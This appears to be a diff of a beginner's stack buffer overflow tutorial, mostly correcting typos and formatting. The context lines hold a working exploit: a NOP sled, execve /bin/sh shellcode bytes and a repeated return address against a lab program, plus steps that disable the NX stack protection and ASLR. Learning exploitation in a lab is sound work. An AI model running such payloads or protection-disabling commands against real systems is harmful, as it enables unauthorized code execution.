@@ -73,7 +73,7 @@ rsp            0x7fffffffdfe0	0x7fffffffdfe0
 rip            0x7f0041414141   0x7f0041414141
 ```
 This means that now we control what the _RIP_ register or (return instruction pointer) point to.\
-This is our powerfull weapon becuse if we can control the _RIP_ register we can point it to our malicious code.
+This is our powerfull weapon because if we can control the _RIP_ register we can point it to our malicious code.
 
 The register _RSP_ point to the top of the current stack frame.\
 We will need to remember this value for later.
@@ -155,7 +155,7 @@ We are getting close:
 
 For last we need to add our rip address that is going to be overwriten:\
 witch is **0x7fffffffdead** and in the _x86_64_ machine endianess:\
-We are going to add it more than one time because we are overwriting registers in ram so we dont know where exactly they are we only kknow that we need to be aligned in order for it to work. And we need to substract it from our nop-sled to not overshoot.
+We are going to add it more than one time because we are overwriting registers in ram so we dont know where exactly they are we only know that we need to be aligned in order for it to work. And we need to substract it from our _NOP-sled_ to not overshoot.
 
 #### Lets try: ####
 ```
@@ -166,10 +166,10 @@ Program received signal SIGSEGV, Segmentation fault.
 
 #### We got very close: ####
 
-**0xffffffdead050f99** is not the address we wanted to **0x7fffffffdead**\
-**0x7fffffffdead** is our return address in the middle of the nop-sled wen we overflow the RIP register wil point to this address and then the exploit begins.
+**0xffffffdead050f99** is not the address we wanted to land **0x7fffffffdead**\
+**0x7fffffffdead** is our return address in the middle of the _NOP-sled_ when we overflow the _RIP_ register wil point to this address and then the exploit begins.
 
-We need to align our exploit to the machine registers in ram \
+We need to align our exploit to the machine registers in ram.\
 A +2 will suffice (this also can vary from system to system somethimes can be +3 or +1)
 
 ```
@@ -196,8 +196,8 @@ But why didn't our exploit worked at all?
 0x7fffffffdecd: 0x90909090  0x90909090
 ```
 
-We can seed that effectively we landed in the middle of our nop-sled but nothing happened.\
-This is beacuse newer versions of gcc and linux by default set the execution bit of the stack page to disabled.\
+We can see that effectively we landed in the middle of our _NOP-sled_ but nothing happened.\
+This is beacuse newer versions of gcc and linux by default set the execution bit of the stack page to disabled (_NX bit_).\
 So we need to recompile again our inocent code disabling the stack execution protection.
 
 ```
@@ -218,12 +218,12 @@ Holy shiet, we have our first shell executed from a an expoit!!!
 ./vuln $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
 Segmentation fault
 ```
-WTF? why didn't work?\
-Newer versions of linux include ASLR or Address space layout randomization.\
-ASLR is a technique of address randomization witch re arranges the internal mappings of the sections of a process memory.\
-Our exploit didn't work beacuse we are asumming our program stack is going to be fixed in the range **0x7ffffffde000-0x7ffffffff000** and ASLR efectively prevents it to work beacuse in linux is enabled by defaut.\
-But we can disable it momentarily
+WTF? why it didn't work?\
+Newer versions of linux include _Address space layout randomization_ or _ASLR_ for short.\
+_ASLR_ is a technique of address randomization witch rearranges the internal mappings of the sections of a process memory.\
+Our exploit didn't work beacuse we are asumming our program stack is going to be in the fixed range **0x7ffffffde000-0x7ffffffff000** and _ASLR_ efectively prevents it to work beacuse in linux is enabled by defaut.\
 
+But we can disable it momentarily:
 ```
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
